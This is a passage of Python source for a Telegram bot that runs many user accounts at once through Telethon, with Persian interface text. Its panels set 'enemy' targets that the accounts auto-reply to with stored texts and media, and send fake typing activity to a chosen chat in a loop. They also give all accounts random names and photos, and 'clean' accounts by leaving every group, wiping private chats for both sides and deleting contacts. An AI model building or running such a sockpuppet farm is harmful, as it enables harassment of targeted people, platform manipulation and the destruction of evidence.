      idx = _FC.index(cur) if cur in _FC else 0
      nxt = _FC[(idx + 1) % len(_FC)]
      cnt = 0
      for s in sessions:
          meta = managed.get(s)
          if meta:
              meta["state"]["self_reply_filter"] = nxt
              save_session_state(s, meta["state"])
              cnt += 1
      await event.answer(f" مد برای {cnt} سشن: {_FL.get(nxt, nxt)}")
      txt = (
          f" Bulk Settings Self — {group_name}\n"
          f"━━━━━━━━━━━━━━\n"
          f" {cnt} سشن تحت تأثیر\n"
          f"مد جدید: {_FL.get(nxt, nxt)}\n\n"
          f"هر تنظیمی اینجا روی همه سشن‌ها اعمال میشه:"
      )
      await sp_edit(event, txt, buttons=[
          [Button.inline("📌 Toggle All Filters", b"g_bulk_fmode")],
          [Button.inline("📌 Set Text for All", b"g_bulk_settext")],
          [Button.inline("📌 Clear All Texts", b"g_bulk_clrtext"),
             Button.inline("📌 Clear All Content", b"g_bulk_clrall")],
          [Button.inline("🔙 Back", b"g_enemy")],
      ])

    @bot.on(events.CallbackQuery(data=b"g_bulk_settext"))
    async def g_bulk_settext_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "g_bulk_text", "group": group_name}
      await sp_edit(event, " متنی که میخوای برای همه سشن‌ها ست بشه رو بنویس:",
                     buttons=[[Button.inline("❌ Cancel", b"g_self_bulk")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"g_bulk_clrtext"))
    async def g_bulk_clrtext_cb(event):
      if not grp_guard(event):
          return await event.answer()
      cnt = 0
      for s in grp_sessions():
          meta = managed.get(s)
          if meta:
              meta["state"]["self_reply_text"] = []
              save_session_state(s, meta["state"])
              cnt += 1
      await event.answer(f" متن {cnt} سشن پاک شد")
      await sp_edit(event, f" متن Self برای {cnt} سشن پاک شد.",
                     buttons=[[Button.inline("🔙 Back", b"g_self_bulk")]])

    @bot.on(events.CallbackQuery(data=b"g_bulk_clrall"))
    async def g_bulk_clrall_cb(event):
      if not grp_guard(event):
          return await event.answer()
      cnt = 0
      for s in grp_sessions():
          meta = managed.get(s)
          if meta:
              meta["state"]["self_reply_text"] = []
              meta["state"]["self_reply_media"] = []
              save_session_state(s, meta["state"])
              cnt += 1
      await event.answer(f" همه محتوای {cnt} سشن پاک شد")
      await sp_edit(event, f" متن و مدیا Self برای {cnt} سشن پاک شدن.",
                     buttons=[[Button.inline("🔙 Back", b"g_self_bulk")]])

    FILTER_LABELS = {
      "all": " همه (رندوم)", "text": " فقط متن",
      "photo": " فقط عکس", "gif": " فقط گیف",
      "video": " فقط ویدیو", "sticker": " فقط استیکر",
    }
    FILTER_CYCLE = ["all", "text", "photo", "gif", "video", "sticker"]

    @bot.on(events.CallbackQuery(pattern=b"gen_(.+)"))
    async def g_enemy_sess(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      if sess not in grp_sessions():
          return await event.answer("")
      meta = managed.get(sess)
      ar = meta["state"].get("auto_reply", False) if meta else False
      fmode = (meta["state"].get("self_reply_filter", "all") if meta else "all")
      raw_media = meta["state"].get("self_reply_media", []) if meta else []
      photos = sum(1 for m in raw_media if (isinstance(m, dict) and m.get("type") == "photo") or isinstance(m, str))
      gifs   = sum(1 for m in raw_media if isinstance(m, dict) and m.get("type") == "gif")
      vids   = sum(1 for m in raw_media if isinstance(m, dict) and m.get("type") == "video")
      stiks  = sum(1 for m in raw_media if isinstance(m, dict) and m.get("type") == "sticker")
      texts  = len(meta["state"].get("self_reply_text", [])) if meta else 0
      enemies = list(meta["state"].get("locked_auto_reply", set())) if meta else []
      enm_cnt = len(enemies)
      enm_str = ", ".join(str(e) for e in enemies[:3]) + (f" +{enm_cnt-3}" if enm_cnt > 3 else "") if enemies else "—"
      txt = (
          f" Self — {sess}\n━━━━━━━━━━━━━━\n"
          f"وضعیت: {'✅ فعال' if ar else '❌ غیرفعال'}\n"
          f"مد فیلتر: {FILTER_LABELS.get(fmode, fmode)}\n"
          f" دشمن‌ها ({enm_cnt}): {enm_str}\n"
          f"━━━━━━━━━━━━━━\n"
          f" Photo: {photos}   GIF: {gifs}   Video: {vids}\n"
          f" استیکر: {stiks}   متن: {texts}\n"
          f"━━━━━━━━━━━━━━\n"
          f"{'اگه دشمن تنظیم نشه: روی همه پیام‌ها ریپلای میده' if not enemies else 'فقط به دشمن‌های تنظیم‌شده ریپلای میده'}"
      )
      await sp_edit(event, txt, buttons=[
          [Button.inline(f"🔴 {'⏹ Off' if ar else ' On'} Self", f"gentgl_{sess}".encode()),
             Button.inline(f"📌 Mode: {FILTER_LABELS.get(fmode,'all')[:10]}", f"genfmode_{sess}".encode())],
          [Button.inline(f"⚔️ Enemy ({enm_cnt})", f"genadd_{sess}".encode()),
             Button.inline("🗑 Remove Enemy", f"gendel_{sess}".encode()),
             Button.inline("🗑 Clear Enemies", f"genclrenemy_{sess}".encode())],
          [Button.inline(f"🖼 Photos ({photos})", f"gensub_photo_{sess}".encode()),
             Button.inline(f"🖼 GIFs ({gifs})", f"gensub_gif_{sess}".encode())],
          [Button.inline(f"🖼 Videos ({vids})", f"gensub_video_{sess}".encode()),
             Button.inline(f"🖼 Stickers ({stiks})", f"gensub_sticker_{sess}".encode())],
          [Button.inline(f"📝 Texts ({texts})", f"gensub_text_{sess}".encode()),
             Button.inline("📌 Clear All Content", f"genclrall_{sess}".encode())],
          [Button.inline("🔙 Back", b"g_enemy")],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"gentgl_(.+)"))
    async def g_enemy_toggle(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" آفلاین")
      meta["state"]["auto_reply"] = not meta["state"].get("auto_reply", False)
      save_session_state(sess, meta["state"])
      st = "✅ فعال" if meta["state"]["auto_reply"] else "❌ غیرفعال"
      await event.answer(f"Self {sess}: {st}")
      await sp_edit(event, f" Self {sess} → {st}",
                     buttons=[[Button.inline("🔙 Back", f"gen_{sess}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"genfmode_(.+)")))
    async def g_self_filter_mode(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" آفلاین")
      cur = meta["state"].get("self_reply_filter", "all")
      idx = FILTER_CYCLE.index(cur) if cur in FILTER_CYCLE else 0
      nxt = FILTER_CYCLE[(idx + 1) % len(FILTER_CYCLE)]
      meta["state"]["self_reply_filter"] = nxt
      save_session_state(sess, meta["state"])
      await event.answer(f"مد: {FILTER_LABELS.get(nxt, nxt)}")
      # refresh the panel
      class FakeEvent:
          pattern_match = event.pattern_match
          sender_id = event.sender_id
          chat_id = event.chat_id
          async def answer(self): pass
          async def edit(self, *a, **kw): await event.edit(*a, **kw)
      await g_enemy_sess(event)

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"genadd_(.+)")))
    async def g_enemy_add_prompt(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      if sess not in grp_sessions():
          return await event.answer("")
      group_pending[event.sender_id] = {"step": "enadd", "sess": sess, "group": group_name}
      await sp_edit(event, f" آیدی دشمن جدید برای {sess}:\n(عدد یا @username)",
                     buttons=[[Button.inline("❌ Cancel", f"gen_{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"gendel_(.+)")))
    async def g_enemy_del_prompt(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      if sess not in grp_sessions():
          return await event.answer("")
      group_pending[event.sender_id] = {"step": "endel", "sess": sess, "group": group_name}
      await sp_edit(event, f" آیدی دشمنی که حذف بشه از {sess}:\n(عدد یا @username)",
                     buttons=[[Button.inline("❌ Cancel", f"gen_{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"genclrenemy_(.+)")))
    async def g_enemy_clr(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      meta = managed.get(sess)
      if meta:
          meta["state"]["locked_auto_reply"] = set()
          save_session_state(sess, meta["state"])
      await event.answer(" دشمن‌های Self پاک شدن")
      await sp_edit(event, f" همه دشمن‌های Self {sess} پاک شدن.",
                     buttons=[[Button.inline("🔙 Back", f"gen_{sess}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"gensub_(photo|gif|video|sticker|text)_(.+)")))
    async def g_self_sub_panel(event):
      if not grp_guard(event):
          return await event.answer()
      media_type = event.pattern_match.group(1).decode()
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      raw_media = meta["state"].get("self_reply_media", []) if meta else []
      text_list = meta["state"].get("self_reply_text", []) if meta else []
      TYPE_EMOJI = {"photo": "", "gif": "", "video": "", "sticker": "", "text": ""}
      if media_type == "text":
          cnt = len(text_list)
          desc = f" متن‌های Self — {sess}\nتعداد: {cnt}\n\n" + \
                   "\n".join(f"• {t[:40]}" for t in text_list[:5]) + \
                   (f"\n...+{cnt-5} بیشتر" if cnt > 5 else "")
      else:
          items = [m for m in raw_media if isinstance(m, dict) and m.get("type") == media_type]
          cnt = len(items)
          desc = f"{TYPE_EMOJI.get(media_type,'')} {media_type}های Self — {sess}\nتعداد: {cnt}"
      group_pending[event.sender_id] = {
          "step": f"self_upload_{media_type}", "sess": sess, "group": group_name
      }
      prompt = {
          "photo": " Photo بفرست (چند تا ممکنه):",
          "gif": " GIF بفرست (چند تا ممکنه):",
          "video": " Video بفرست (چند تا ممکنه):",
          "sticker": " استیکر بفرست (چند تا ممکنه):",
          "text": " متن بفرست (هر پیام یه آیتم):",
      }
      await sp_edit(event, f"{desc}\n\n{prompt[media_type]}", buttons=[
          [Button.inline("🔘 Done /done", f"gdone_{sess}".encode()),
             Button.inline(f"📌 Clear All", f"genclrsub_{media_type}_{sess}".encode())],
          [Button.inline("🔙 Back", f"gen_{sess}".encode())],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"genclrsub_(photo|gif|video|sticker|text)_(.+)")))
    async def g_self_clr_sub(event):
      if not grp_guard(event):
          return await event.answer()
      media_type = event.pattern_match.group(1).decode()
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      if meta:
          if media_type == "text":
              meta["state"]["self_reply_text"] = []
          else:
              meta["state"]["self_reply_media"] = [
                    m for m in meta["state"].get("self_reply_media", [])
                    if isinstance(m, dict) and m.get("type") != media_type
              ]
          save_session_state(sess, meta["state"])
      await event.answer(f" پاک شد")
      await sp_edit(event, f" {media_type} های Self {sess} پاک شد.",
                     buttons=[[Button.inline("🔙 Back", f"gen_{sess}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"genclrall_(.+)")))
    async def g_self_clr_all(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      meta = managed.get(sess)
      if meta:
          meta["state"]["self_reply_media"] = []
          meta["state"]["self_reply_text"] = []
          save_session_state(sess, meta["state"])
      await event.answer(" همه پاک شد")
      await sp_edit(event, f" همه محتوای Self {sess} پاک شد.",
                     buttons=[[Button.inline("🔙 Back", f"gen_{sess}".encode())]])

    # ═══════════════════════════════════════════════════════════
    # GROUP BOT: ACTION PANEL  (g_action prefix)
    # ═══════════════════════════════════════════════════════════
    _G_ACTION_MAP = {
      "typing":   (" درحال تایپ",             lambda: SendMessageTypingAction()),
      "voice":    (" درحال ارسال ویس",         lambda: SendMessageRecordAudioAction()),
      "video":    (" درحال ارسال ویدیو",       lambda: SendMessageUploadVideoAction(progress=0)),
      "sticker":  (" درحال پیدا کردن استیکر", lambda: SendMessageChooseStickerAction()),
      "vidnote":  (" درحال ارسال ویدیو مسیج", lambda: SendMessageRecordRoundAction()),
      "document": (" درحال ارسال فایل",        lambda: SendMessageUploadDocumentAction(progress=0)),
    }

    def _g_act_panel_text():
      target = groups_db.get(group_name, {}).get("action_target", "—")
      sessions = grp_sessions()
      online = sum(1 for s in sessions if s in managed)
      return (
          f" Bulk Action — {group_name}\n"
          f"━━━━━━━━━━━━━━\n"
          f" سشن‌ها: {len(sessions)}   آنلاین: {online}\n"
          f" گپ هدف: {target}\n\n"
          f"یه اکشن انتخاب کن — همه سشن‌های آنلاین ارسال می‌کنن:"
      )

    def _g_act_buttons():
      items = list(_G_ACTION_MAP.items())
      rows = []
      for i in range(0, len(items), 2):
          pair = items[i:i+2]
          rows.append([Button.inline(lbl, f"g_actdo_{ak}".encode()) for ak, (lbl, _) in pair])
      rows.append([Button.inline("⚙️ Set Target Chat", b"g_acttgt"),
                     Button.inline("📋 From List", b"g_actdlg")])
      rows.append([Button.inline("🔙 Back", b"g_home")])
      return rows

    @bot.on(events.CallbackQuery(data=b"g_action"))
    async def g_action_cb(event):
      if not grp_guard(event):
          return await event.answer()
      await sp_edit(event, _g_act_panel_text(), buttons=_g_act_buttons())
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"g_acttgt"))
    async def g_acttgt_cb(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "g_act_target", "group": group_name}
      await sp_edit(event,
          f" آیدی یا @username گپ هدف برای اکشن گروه «{group_name}»:\n"
          f"(مثال: @mygroup یا -100xxxxxxxxxx)",
          buttons=[[Button.inline("❌ Cancel", b"g_action")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"g_actdlg"))
    async def g_actdlg_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      first_sess = next((s for s in sessions if s in managed), None)
      if not first_sess:
          return await event.answer(" هیچ سشن آنلاینی نیست", alert=True)
      await event.answer(" در حال دریافت لیست...")
      try:
          dialogs = []
          async for d in managed[first_sess]["client"].iter_dialogs(limit=100):
              if d.is_group or d.is_channel:
                    title = (d.title or str(d.id))[:25]
                    dialogs.append((title, str(d.id)))
              if len(dialogs) >= 20:
                    break
          if not dialogs:
              return await sp_edit(event, " هیچ گروه/کانالی پیدا نشد.",
                                    buttons=[[Button.inline("🔙 Back", b"g_action")]])
          rows = [[Button.inline(title, f"g_actsel_{cid}".encode())]
                    for title, cid in dialogs]
          rows.append([Button.inline("🔙 Back", b"g_action")])
          await sp_edit(event, f" انتخاب گپ هدف — {group_name}:", buttons=rows)
      except Exception as e:
          await sp_edit(event, f" خطا: {e}",
                         buttons=[[Button.inline("🔙 Back", b"g_action")]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"g_actsel_(.+)")))
    async def g_actsel_cb(event):
      if not grp_guard(event):
          return await event.answer()
      chat_id_str = event.pattern_match.group(1).decode()
      groups_db.setdefault(group_name, {})["action_target"] = chat_id_str
      save_groups()
      await event.answer(f" گپ هدف: {chat_id_str}")
      await sp_edit(event, _g_act_panel_text(), buttons=_g_act_buttons())

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"g_actdo_(.+)")))
    async def g_actdo_cb(event):
      if not grp_guard(event):
          return await event.answer()
      act_key = event.pattern_match.group(1).decode()
      target_str = groups_db.get(group_name, {}).get("action_target", "")
      if not target_str or target_str == "—":
          return await event.answer(" اول گپ هدف رو تنظیم کن", alert=True)
      act_info = _G_ACTION_MAP.get(act_key)
      if not act_info:
          return await event.answer(" اکشن نامعلوم", alert=True)
      act_lbl, act_fn = act_info
      prev = act_loop_tasks.get(f"g_{group_name}")
      if prev and not prev.done():
          prev.cancel()

      sessions = grp_sessions()
      await sp_edit(event,
          f" اکشن لوپ شروع شد!\n{act_lbl}\n━━━━━━━━━━━━━━\n"
          f" {len(sessions)} سشن — هر 5 ثانیه",
          buttons=[[Button.inline("🔴 Stop", b"g_actstop")]])
      await event.answer()

      async def _resolve_g_target(client, t: str):
          from telethon.tl import types as _tlt
          t = t.strip()
          if t.lstrip("-").isdigit():
              t_int = int(t)
              try:
                    return await client.get_entity(t_int)
              except Exception:
                    pass
              if t_int < 0:
                    try:
                        raw = abs(t_int)
                        if raw > 1000000000000:
                            raw -= 1000000000000
                        return await client.get_entity(_tlt.PeerChannel(channel_id=raw))
                    except Exception:
                        pass
              return None
          try:
              return await client.get_entity(t)
          except Exception:
              return None

      async def _g_act_send_one(s, ent_cache):
          meta = managed.get(s)
          if not meta:
              return
          try:
              if s not in ent_cache:
                    ent_cache[s] = await _resolve_g_target(meta["client"], target_str)
              ent = ent_cache[s]
              if ent is None:
                    return
              await meta["client"](SetTypingRequest(peer=ent, action=act_fn()))
          except Exception as e:
              log.warning(f"[g_actloop:{group_name}] {s} error: {e}")
              ent_cache.pop(s, None)

      async def _g_act_loop():
          ent_cache = {}
          try:
              while True:
                    try:
                        await asyncio.gather(*[_g_act_send_one(s, ent_cache)
                                               for s in grp_sessions()], return_exceptions=True)
                    except asyncio.CancelledError:
                        raise
                    except Exception as e:
                        log.warning(f"[g_actloop:{group_name}] gather error: {e}")
                    await asyncio.sleep(5)
          except asyncio.CancelledError:
              pass

      task = asyncio.get_event_loop().create_task(_g_act_loop())
      act_loop_tasks[f"g_{group_name}"] = task

    @bot.on(events.CallbackQuery(data=b"g_actstop"))
    async def g_actstop_cb(event):
      if not grp_guard(event):
          return await event.answer()
      task = act_loop_tasks.get(f"g_{group_name}")
      if task and not task.done():
          task.cancel()
      act_loop_tasks.pop(f"g_{group_name}", None)
      await sp_edit(event, " اکشن لوپ متوقف شد.",
          buttons=[[Button.inline("⚡ Retry Action", b"g_action"),
                      Button.inline("📋 Menu", b"g_home")]])
      await event.answer()

    # ═══════════════════════════════════════════════════════════
    # GROUP BOT: ACCOUNT CLEANER
    # ═══════════════════════════════════════════════════════════
    async def _grp_run_clean(client):
      """Delete owned channels, leave all groups/channels, block bots, clear private history, delete contacts."""
      from telethon.tl.functions.channels import DeleteChannelRequest, LeaveChannelRequest
      from telethon.tl.functions.messages import DeleteHistoryRequest, DeleteChatUserRequest
      from telethon.tl.functions.contacts import BlockRequest, DeleteContactsRequest, GetContactsRequest
      from telethon.tl import types as _tlt
      owned_del = left = privates = bots_blocked = contacts_deleted = 0
      try:
          dialogs = await client.get_dialogs(limit=None)
      except Exception:
          dialogs = []
      me = None
      try:
          me = await client.get_me()
      except Exception:
          pass
      for d in dialogs:
          ent = d.entity
          try:
              if isinstance(ent, _tlt.Channel):
                    if getattr(ent, 'creator', False):
                        await client(DeleteChannelRequest(ent))
                        owned_del += 1
                    else:
                        await client(LeaveChannelRequest(ent))
                        left += 1
                    await asyncio.sleep(0.5)
              elif isinstance(ent, _tlt.Chat):
                    if not getattr(ent, 'deactivated', False) and me:
                        try:
                            await client(DeleteChatUserRequest(chat_id=ent.id, user_id=me))
                        except Exception:
                            pass
                        left += 1
                    await asyncio.sleep(0.5)
              elif isinstance(ent, _tlt.User) and not getattr(ent, 'is_self', False):
                    is_bot = getattr(ent, 'bot', False)
                    if is_bot:
                        # Block the bot then wipe history
                        try:
                            await client(BlockRequest(id=ent))
                        except Exception:
                            pass
                        try:
                            await client(DeleteHistoryRequest(peer=ent, max_id=0, revoke=True))
                        except Exception:
                            pass
                        bots_blocked += 1
                    else:
                        # Regular user or deleted account — wipe two-sided
                        await client(DeleteHistoryRequest(peer=ent, max_id=0, revoke=True))
                        privates += 1
                    await asyncio.sleep(0.3)
          except Exception as e:
              log.warning(f"[g_clean:{group_name}] err on {getattr(ent, 'id', '?')}: {e}")
      # Delete all contacts
      try:
          contacts_result = await client(GetContactsRequest(hash=0))
          if hasattr(contacts_result, 'users') and contacts_result.users:
              user_ids = [u.id for u in contacts_result.users if not getattr(u, 'is_self', False)]
              if user_ids:
                    await client(DeleteContactsRequest(id=user_ids))
                    contacts_deleted = len(user_ids)
                    await asyncio.sleep(0.5)
      except Exception as e:
          log.warning(f"[g_clean:{group_name}] contacts delete err: {e}")
      return owned_del, left, privates, bots_blocked, contacts_deleted

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"g_clean_(.+)")))
    async def g_clean_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      if sess not in grp_sessions():
          return await event.answer("")
      await sp_edit(event,
          f" تأیید پاک‌سازی — {sess}\n━━━━━━━━━━━━━━\n"
          f" چنل‌هایی که مالکشه حذف می‌کنه\n"
          f" از کل گروه‌ها و چنل‌ها لفت می‌ده\n"
          f" کل پیوی‌ها رو دو طرفه پاک می‌کنه\n"
          f" کل مخاطبان رو حذف می‌کنه\n\n"
          f"این عملیات برگشت‌ناپذیره! مطمئنی؟",
          buttons=[
              [Button.inline(f"✅ Yes — Clean {sess}", f"g_cleando_{sess}".encode())],
              [Button.inline("❌ Cancel", f"ga_{sess}".encode())],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"g_cleando_(.+)")))
    async def g_cleando_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" اکانت آفلاینه — اول روشنش کن", alert=True)
      await event.answer(" شروع شد...")
      await sp_edit(event,
          f" پاک‌سازی {sess} در حال اجراست...\nبعد از اتمام نتیجه نشون داده می‌شه.",
          buttons=[[Button.inline("📋 Menu", b"g_home")]])

      async def _do():
          try:
              owned, lft, privs, bots, contacts = await _grp_run_clean(meta["client"])
              await bot.send_message(event.chat_id,
                    f" پاک‌سازی {sess} تموم شد!\n━━━━━━━━━━━━━━\n"
                    f" چنل‌های حذف‌شده: {owned}\n"
                    f" لفت‌شده: {lft}\n"
                    f" پیوی‌های پاک‌شده: {privs}\n"
                    f" ربات‌های بلاک‌شده: {bots}\n"
                    f" مخاطبان حذف‌شده: {contacts}",
                    buttons=[[Button.inline("👤 Accounts", b"g_accounts"),
                              Button.inline("📋 Menu", b"g_home")]])
          except Exception as e:
              await bot.send_message(event.chat_id, f" خطا در پاک‌سازی {sess}: {e}")
      asyncio.get_event_loop().create_task(_do())

    @bot.on(events.CallbackQuery(data=b"g_cleanall"))
    async def g_cleanall_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      online = [s for s in sessions if s in managed]
      await sp_edit(event,
          f" تأیید پاک‌سازی گروه {group_name}\n━━━━━━━━━━━━━━\n"
          f" {len(online)} اکانت آنلاین پاک‌سازی می‌شن\n\n"
          f" چنل‌هایی که مالکن حذف می‌شن\n"
          f" از کل گروه‌ها و چنل‌ها لفت می‌دن\n"
          f" کل پیوی‌ها رو دو طرفه پاک می‌کنن\n"
          f" کل مخاطبان حذف می‌شن\n\n"
          f"این عملیات برگشت‌ناپذیره! مطمئنی؟",
          buttons=[
              [Button.inline(f"✅ Yes — Clean All ({len(online)})", b"g_cleandoall")],
              [Button.inline("❌ Cancel", b"g_home")],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"g_cleandoall"))
    async def g_cleandoall_cb(event):
      if not grp_guard(event):
          return await event.answer()
      online = [s for s in grp_sessions() if s in managed]
      if not online:
          return await event.answer(" هیچ اکانت آنلاینی نیست", alert=True)
      await event.answer(" شروع شد...")
      await sp_edit(event,
          f" پاک‌سازی همگانی ریموت {group_name} شروع شد...\n{len(online)} اکانت در صف.",
          buttons=[[Button.inline("📋 Menu", b"g_home")]])

      async def _do_all():
          results = []
          for s in online:
              meta = managed.get(s)
              if not meta:
                    results.append(f"• {s}:  آفلاین")
                    continue
              try:
                    owned, lft, privs, bots, contacts = await _grp_run_clean(meta["client"])
                    results.append(f"• {s}:  {owned} حذف | {lft} لفت | {privs} پیوی | {bots} | {contacts} مخاطب")
                    await asyncio.sleep(2)
              except Exception as e:
                    results.append(f"• {s}:  {e}")
          await bot.send_message(event.chat_id,
              f" پاک‌سازی همگانی ریموت {group_name} تموم شد!\n━━━━━━━━━━━━━━\n"
              + "\n".join(results),
              buttons=[[Button.inline("📋 Menu", b"g_home")]])
      asyncio.get_event_loop().create_task(_do_all())

    # ═══════════════════════════════════════════════════════════
    # GROUP BOT: PROFILE PANEL
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(data=b"g_profile"))
    async def g_profile_cb(event):
      if not grp_guard(event):
          return await event.answer()
      await sp_edit(event, " Profile\nنوع عملیات رو انتخاب کن:", buttons=[
          [Button.inline("🔘 Single", b"gprf_single"),
             Button.inline("📌 All (Bulk)", b"gprf_all")],
          [Button.inline("🔙 Back", b"g_home")],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gprf_single"))
    async def g_profile_single_cb(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      rows = [[Button.inline(f"🗂 {'🟢' if s in managed else '🔴'} {s}", f"gprf_{s}".encode())]
                 for s in sessions]
      rows.append([Button.inline("🔙 Back", b"g_profile")])
      await sp_edit(event, " پروفایل تکی — اکانت رو انتخاب کن:", buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gprf_all"))
    async def g_profile_all_cb(event):
      if not grp_guard(event):
          return await event.answer()
      await sp_edit(event, " تغییر پروفایل همه اکانت‌ها:", buttons=[
          [Button.inline("📌 All Profile Photos", b"gprfall_photo"),
             Button.inline("📌 All Names", b"gprfall_name")],
          [Button.inline("📌 All Bios", b"gprfall_bio")],
          [Button.inline("🏷 Random Names", b"gprfall_randname")],
          [Button.inline("📌 Delete All Profile Photos", b"gprfall_delphoto")],
          [Button.inline("🔙 Back", b"g_profile")],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gprfall_photo"))
    async def g_profile_all_photo(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "prfphoto_all", "group": group_name}
      await sp_edit(event, " Photo پروفایل جدید برای همه اکانت‌ها:\nعکس بفرست:",
                     buttons=[[Button.inline("❌ Cancel", b"g_profile")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gprfall_name"))
    async def g_profile_all_name(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "prfname_all", "group": group_name}
      await sp_edit(event, " نام جدید برای همه اکانت‌ها:\n(نام نام_خانوادگی)",
                     buttons=[[Button.inline("❌ Cancel", b"g_profile")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gprfall_bio"))
    async def g_profile_all_bio(event):
      if not grp_guard(event):
          return await event.answer()
      group_pending[event.sender_id] = {"step": "prfbio_all", "group": group_name}
      await sp_edit(event, " بیو جدید برای همه اکانت‌ها:\n(حداکثر 70 کاراکتر)",
                     buttons=[[Button.inline("❌ Cancel", b"g_profile")]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"gprf_(.+)"))
    async def g_profile_sess(event):
      if not grp_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      if sess not in grp_sessions():
          return await event.answer("")
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" آفلاین")
      try:
          me = await meta["client"].get_me()
          name = f"{me.first_name or ''} {me.last_name or ''}".strip()
          bio_obj = await meta["client"](functions.users.GetFullUserRequest(me))
          bio = bio_obj.full_user.about or "—"
      except Exception:
          name = sess
          bio = "—"
      txt = (
          f" Profile — {sess}\n━━━━━━━━━━━━━━\n"
          f"نام: {name}\n"
          f"بیو: {bio}"
      )
      await sp_edit(event, txt, buttons=[
          [Button.inline("🔄 Change Name", f"gprfname_{sess}".encode()),
             Button.inline("🔄 Change Bio", f"gprfbio_{sess}".encode())],
          [Button.inline("🖼 Change Photo", f"gprfphoto_{sess}".encode()),
             Button.inline("📌 Delete All Photos", f"gprfdelphoto_{sess}".encode())],
          [Button.inline("🔙 Back", b"g_profile")],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"gprfall_delphoto"))
    async def g_profile_all_delphoto(event):
      if not grp_guard(event):
          return await event.answer()
      sessions = grp_sessions()
      ok = fail = skipped = 0
      await sp_edit(event, " در حال حذف عکس‌های پروفایل همه اکانت‌ها...",
                     buttons=[[Button.inline("🔙 Back", b"gprf_all")]])
      await event.answer()
      from telethon.tl.functions.photos import GetUserPhotosRequest, DeletePhotosRequest
      from telethon.tl.types import InputPhoto
      for s in sessions:
          meta = managed.get(s)
          if not meta:
              skipped += 1
              continue
          try:
              result = await meta["client"](GetUserPhotosRequest(
                    user_id="me", offset=0, max_id=0, limit=100))
              photos = result.photos
              if not photos:
                    skipped += 1
                    continue
              input_photos = [
                    InputPhoto(id=p.id, access_hash=p.access_hash,
                               file_reference=p.file_reference)
                    for p in photos
              ]
              await meta["client"](DeletePhotosRequest(id=input_photos))
              ok += 1
              await asyncio.sleep(2)
          except Exception:
              fail += 1
      await sp(event.chat_id,
          f" Delete Photosی پروفایل تموم شد!\n موفق: {ok}   ناموفق: {fail}   آفلاین: {skipped}",
          buttons=[[Button.inline("🔙 Back", b"gprf_all"),
                      Button.inline("📋 Menu", b"g_home")]])

    @bot.on(events.CallbackQuery(data=b"gprfall_randname"))
    async def g_profile_all_randname(event):
      if not grp_guard(event):
          return await event.answer()
      await event.answer(" در حال تولید اسم‌های رندوم...")
      sessions = [s for s in grp_sessions() if s in managed]
      if not sessions:
          return await sp_edit(event, " هیچ اکانت آنلاینی وجود نداره.",
              buttons=[[Button.inline("🔙 Back", b"gprf_all")]])
      names = _gen_unique_random_names(len(sessions))
      ok, fail = 0, []
      for sess, (fn, ln) in zip(sessions, names):
          meta = managed.get(sess)
          if not meta:
              fail.append(sess)
              continue
          try:
              await meta["client"](functions.account.UpdateProfileRequest(
                    first_name=fn, last_name=ln))
              ok += 1
              await asyncio.sleep(1.2)
          except Exception as _e:
              fail.append(f"{sess}: {str(_e)[:40]}")
      txt = (f" Random Names\n━━━━━━━━━━━━━━\n"
               f" موفق: {ok}   ناموفق: {len(fail)}\n")
      if fail:
          txt += "\n".join(fail[:10])
      await sp(event.chat_id, txt,
          buttons=[[Button.inline("🔙 Back", b"gprf_all"),
